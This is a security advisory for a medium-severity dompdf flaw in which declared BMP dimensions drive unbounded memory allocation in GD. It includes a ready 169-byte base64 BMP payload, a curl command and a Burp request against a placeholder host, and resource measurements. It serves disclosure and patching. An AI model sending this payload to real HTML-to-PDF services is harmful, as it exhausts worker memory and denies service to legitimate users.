# [M] Dompdf: Uncontrolled resource consumption based on declared BMP dimensions

## Summary
Severity: Medium
Advisory: GHSA-8hg6-c449-896m
CVE: CVE-2026-59941
CWE: CWE-400
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-22
Source: https://github.com/advisories/GHSA-8hg6-c449-896m
Type: github-advisory

## Affected
- Packagist: `dompdf/dompdf` — affected >=0 <3.1.6

## Details
### Summary

dompdf accepts a BMP image and generates a PDF-compatible PNG based only on its *declared* header dimensions and never bounds width × height before the image is converted through GD. A 58-byte BMP whose header declares e.g. `6000×6000` is accepted and later drives `imagecreatetruecolor($width, $height)` (and PHP's native BMP decoder) to allocate the full pixel canvas.
 
A payload can fit in a single HTTP request: the BMP can be inlined as a `data:image/bmp;base64,…` URI inside attacker-controlled HTML, so no upload, no remote fetch, and no chroot-reachable file is required. It was demonstrated that a **169-byte** request drove dompdf to render to **~412 MB peak RSS and ~4.8 s** of CPU/wall time, versus ~34 MB for an identically-sized benign request — roughly a 12× memory amplification per request, repeatable and unauthenticated.


### Details
## Root cause
 
The image is processed based on declared dimensions and type alone — no pixel budget:
 
```php
// src/Image/Cache.php:131-134
list($width, $height, $type) = Helpers::dompdf_getimagesize($resolved_url, $options->getHttpContext());
if (($width && $height && in_array($type, ["gif","png","jpeg","bmp","svg","webp"], true)) === false) {
    throw new ImageException("Image type unknown", E_WARNING);
}
```
 
For BMPs that `getimagesize()` does not fully parse, dompdf trusts the raw header fields:
 
```php
// src/Helpers.php:833-837
if (substr($data, 0, 2) === "BM") {
    $meta = unpack("vtype/Vfilesize/Vreserved/Voffset/Vheadersize/Vwidth/Vheight", $data);
    $width  = (int) $meta["width"];
    $height = (int) $meta["height"];
    $type   = "bmp";
}
```
 
At conversion time the canvas is allocated from those declared dimensions, before any check that enough pixel data exists:
 
```php
// src/Helpers.php:868-869  — native decoder is tried FIRST on PHP >= 7.2
if (function_exists("imagecreatefrombmp") && ($im = imagecreatefrombmp($filename)) !== false) {
    return $im;
}
// src/Helpers.php:940  — hand-rolled fallback
$im = imagecreatetruecolor($meta['width'], $meta['height']);
```
 
There is no maximum width/height or maximum total-pixel guard anywhere on this path.
 
## Source-to-sink
 
1. Attacker HTML reaches `Dompdf::loadHtml()` with `<img src="data:image/bmp;base64,…">` (or any BMP `src`).
2. `Dompdf::render()` decorates frames; `Frame\Factory` marks `<img>` as an image; `FrameDecorator\Image` calls `Image\Cache::resolve_url()`.
3. `Image\Cache::resolve_url()` accepts the BMP on declared dimensions/type (`src/Image/Cache.php:131-134`).
4. During render, `Adapter\CPDF::image()` identifies the BMP and calls `_convert_to_png()` (`src/Adapter/CPDF.php:593`).
5. `_convert_to_png()` invokes `Helpers::imagecreatefrombmp()`, which allocates the full canvas — via the native `imagecreatefrombmp()` on PHP ≥ 7.2, or the hand-rolled `imagecreatetruecolor()` fallback otherwise.

### PoC
erified against dompdf @ `a6ddc4f` on PHP 8.3.6 with GD enabled.
 
The crafted BMP is 58 bytes: a 14-byte file header + 40-byte `BITMAPINFOHEADER` declaring the target width/height at 24bpp + 4 padding bytes. Inlined as a data URI, the full attacker payload is 169 bytes:
 
```
<html><body><img src="data:image/bmp;base64,Qk06AAAAAAAAADYAAAAoAAAAcBcAAHAXAAABABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" style="width:1px;height:1px"></body></html>
```
 
(The base64 above decodes to a 58-byte BMP declaring `6000×6000`. The CSS `width:1px;height:1px` does not help the defender — the intrinsic decode happens regardless.)
 
### 1 — Direct conversion
 
```
native imagecreatefrombmp exists: yes
dompdf_getimagesize  => 6000x6000 type=bmp
imagecreatefrombmp   => GdImage 6000x6000   (allocated from a 58-byte file)
Maximum resident set size: 160 MB        (10x10 control: 24 MB)
php_peak (PHP-managed): 0.8 MB           <-- GD memory is native; PHP memory_limit does NOT cap it
```
 
The PHP-managed peak is under 1 MB while RSS is 160 MB: the canvas lives in GD's native allocator, so `memory_limit` does not bound it.
 
### 2 — Full `Dompdf::render()`
 
```
declared 6000x6000  payload 169 bytes  render 5.8 s  RSS ~417 MB  output 106 KB
declared 10x10      payload 169 bytes  render 0.01 s RSS  ~30 MB   output 1.4 KB
```
 
### 3 — HTTP reproduction (curl / Burp)
 
Reproduced against a minimal PDF endpoint (`server.php`, included) that simply renders posted HTML — the shape of any invoice/report/HTML-to-PDF service. The endpoint sets `isRemoteEnabled=false`; the attack still works because `data:` URIs are an allowed protocol by default and need no remote fetch.
 
curl:
```bash
curl -s -X POST "https://TARGET/render" \
  --data-binary '<html><body><img src="data:image/bmp;base64,Qk06AAAAAAAAADYAAAAoAAAAcBcAAHAXAAABABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" style="width:1px;height:1px"></body></html>' \
  -o /dev/null -w 'http=%{http_code} time=%{time_total}s\n'
```
 
Burp Repeater (enable "Update Content-Length"):
```
POST /render HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/html
Connection: close
 
<html><body><img src="data:image/bmp;base64,Qk06AAAAAAAAADYAAAAoAAAAcBcAAHAXAAABABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" style="width:1px;height:1px"></body></html>
```
 
Observed (peak RSS read from the worker's `/proc/<pid>/status` `VmHWM`, each on a fresh worker so the high-water mark is per-request):
 
```
[ATTACK ] declared 6000x6000  request=169 B  -> 200 application/pdf  output=106397 B  server peak RSS ~412 MB  wall 4.8 s
[CONTROL] declared 10x10      request=169 B  -> 200 application/pdf  output=1407 B    server peak RSS ~34 MB   wall <0.1 s
```
 
Two identically sized 169-byte requests; the only difference is the dimensions declared inside the 58-byte BMP. The attack request costs ~378 MB extra native memory and ~5 s CPU. The cost scales with declared `width × height`, bounded only by the 32-bit header fields and the host's available memory (the process is OOM-killed before the theoretical maximum).

## Impact
 
A single unauthenticated 169-byte request forces ~400 MB of native allocation and several seconds of CPU in the rendering worker. PDF rendering is typically done by a small pool of PHP-FPM or queue workers; a handful of concurrent requests exhausts that pool's memory and stalls or OOM-kills workers, denying service to legitimate users. Because the heavy allocation is in GD's native allocator, a per-request `memory_limit` does **not** contain it.

**Caveat:** this is a resource-exhaustion (DoS) primitive, not data disclosure or code execution. Some deployments already sandbox dompdf behind render timeouts, worker memory caps (cgroups), or job isolation — those reduce real-world impact. However, the specific GD implementation on a system may not be constrained by PHP limits, allowing system-level resource consumption beyond those allocated to PHP.

## References
- https://github.com/dompdf/dompdf/security/advisories/GHSA-8hg6-c449-896m
- https://github.com/dompdf/dompdf/commit/7c65e7bbeccf146b2409740405af73949ad129d0
- https://github.com/dompdf/dompdf
- https://github.com/dompdf/dompdf/releases/tag/v3.1.6
